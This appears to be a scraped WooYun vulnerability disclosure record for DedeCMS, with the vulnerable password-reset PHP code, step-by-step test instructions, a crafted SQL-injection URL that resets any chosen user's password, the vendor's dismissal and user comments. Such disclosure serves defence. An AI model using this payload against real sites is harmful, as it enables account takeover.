{"id": 6281, "wybug_id": "wooyun-2013-042167", "wybug_title": "Dedecms SQL注入漏洞导致可以修改任意用户密码", "wybug_corp": "Dedecms", "wybug_author": "Matt", "wybug_date": "2013-11-06 19:20", "wybug_open_date": "2014-02-01 19:21", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-11：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-01：\t细节向公众公开  简要描述： DEDEcms SQL注入漏洞导致可以修改任意用户密码 详细说明：  DEDEcms SQL注入漏洞导致可以修改任意用户密码需要开启会员模块\n/member/resetpassword.phpelse if($dopost == \"getpasswd\"){    //修改密码    if(empty($id))//获取参数ID 没有进过任何处理！！    {        ShowMsg(\"对不起，请不要非法提交\",\"login.php\");        exit();    }    $mid = preg_replace(\"#[^0-9]#\", \"\", $id);//这里匹配出id里面的 数字 然后在下面进行查询    $row = $db->GetOne(\"SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'\");    if(empty($row))    {        ShowMsg(\"对不起，请不要非法提交\",\"login.php\");        exit();    }    if(empty($setp))    {        $tptim= (60*60*24*3);        $dtime = time();        if($dtime - $tptim > $row['mailtime'])        {            $db->executenonequery(\"DELETE FROM `#@__pwd_tmp` WHERE `md` = '$id';\");            ShowMsg(\"对不起，临时密码修改期限已过期\",\"login.php\");            exit();        }        require_once(dirname(__FILE__).\"/templets/resetpassword2.htm\");    }    elseif($setp == 2)//我们设置参数setp=2执行到这里    {        if(isset($key)) $pwdtmp = $key;//key在我们找回密码的时候会发送给我们！        $sn = md5(trim($pwdtmp));        if($row['pwd'] == $sn)        {            if($pwd != \"\")            {                if($pwd == $pwdok)                {                    $pwdok = md5($pwdok);                    $sql = \"DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';\";                    $db->executenonequery($sql);                    $sql = \"UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';\";//这里的update就是我们利用的店，pwdok就是我们设置的密码\t\t\t\t\techo $sql;                    if($db->executenonequery($sql))                    {                        showmsg('更改密码成功，请牢记新密码', 'login.php');                        exit;                    }                }            }            showmsg('对不起，新密码为空或填写不一致', '-1');            exit;        }\n  \t\t测试方法 如下\t\t1 首先注册一个用户\t\t2 找回密码 选择通过安全问题取回\t\t3 填写完毕信息之后点击确认\t\t4  然后点击确认 会跳转到这样一个URL上 http://127.0.0.1/dedecms/member/resetpassword.php?dopost=getpasswd&amp;id=9&amp;key=elLSvQu8\t\t然后我们就可以构造EXP如下了 \t\thttp://127.0.0.1/dedecms/member/resetpassword.php?dopost=getpasswd&id=xx' or userid='diehack' and '9&key=SULMhhPU&setp=2&pwd=1&pwdok=1  \t\t把上面url中的9改成 之前跳转到链接的id参数，然后把key也改成之前跳转的链接的key参数\t\t然后userid可以修改成你需要修改密码的用户\t\tpwd和pwdok就是需要修改成的密码 必须保持一样  \t\t这个注入的难点在于\t\t$mid = preg_replace(\"#[^0-9]#\", \"\", $id);\t\t这里匹配出了所有数字\t\t如果我们实用忙注 \t\t那么需要subtring(xx,1,2)来逐个获取 \t\t而且又不支持报错显示 不然就可以报错注入了\t\t想要利用 至少需要注册1K个账户 才能利用起来\t\t利用难度比较大！   漏洞证明：  \n\n\n\n   修复方案：  过滤ID   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-02-01 19:21 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-06 19:20 |    \t\t付弘雪 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:10        | 希望和业内各位大牛多多交流)\t\t \n  我靠 1楼。。。。    \n     2013-11-06 19:23 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  又爆洞了吗    \n     2013-11-06 19:24 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  陌陌的关注    \n     2013-11-06 19:24 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  @xsser 微信的关注    \n     2013-11-06 19:27 |    \t\tPgHook \t\t\t( 普通白帽子  |\t\t\t        Rank:964 漏洞数:115        | ...........................................)\t\t \n  关注！！！    \n     2013-11-06 19:30 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  @xsser 我感觉dedecms厂商注册了一个帐号之后就已经经常不上乌云了    \n     2013-11-06 19:42 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1199 漏洞数:319        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  坐等忽略     \n     2013-11-06 22:34 |    \t\tMr.醉心 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 爱生活，爱音乐，爱美女，更爱波多野结衣)\t\t \n  又爆洞了吗默默的关注下    \n     2013-11-07 08:33 |    \t\tadmin1993 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:39        | 0101001010010100101001010010100101001010...)\t\t \n  默默关注……    \n     2013-11-07 09:13 |    \t\t松子 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | 无事)\t\t \n  默默关注……    \n     2013-11-07 09:19 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  求忽略。。。    \n     2013-11-07 14:47 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  默默关注……     \n     2013-11-07 23:29 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  求忽略   求细节啊    \n     2013-11-12 18:18 |    \t\t好人 \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:6        | 多少人曾爱慕你年轻的容颜)\t\t \n  蛋疼死了    \n     2013-11-13 16:18 |    \t\t杜工 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:3        | 架构人生)\t\t \n  快快忽略吧    \n     2013-11-14 09:30 |    \t\t肥羊宅 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:2        | 只是来学习安全知识的……估计抓不出多少漏...)\t\t \n  dede……这特么是通用吧……    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}